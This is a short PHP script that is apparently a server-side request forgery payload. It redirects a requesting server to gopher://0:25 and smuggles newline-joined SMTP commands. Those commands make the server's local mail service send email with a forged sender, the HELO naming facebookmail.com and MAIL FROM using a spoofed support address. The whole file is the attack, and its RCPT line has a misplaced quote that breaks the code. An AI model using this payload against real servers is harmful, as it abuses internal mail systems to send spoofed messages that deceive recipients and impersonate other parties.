<?php
	$commands = array(
		'HELO facebookmail.com',
		'MAIL FROM: <support@codefortynine.com>',
		'RCPT To: <bug.allmight@gmail.com'>,
		'DATA',
		'Subject: yhv.com',
		'you ggfgfgf',
	);
	
	$payload = implode('%0A', $commands);

	header('Location: gopher://0:25/_'.$payload);
?>
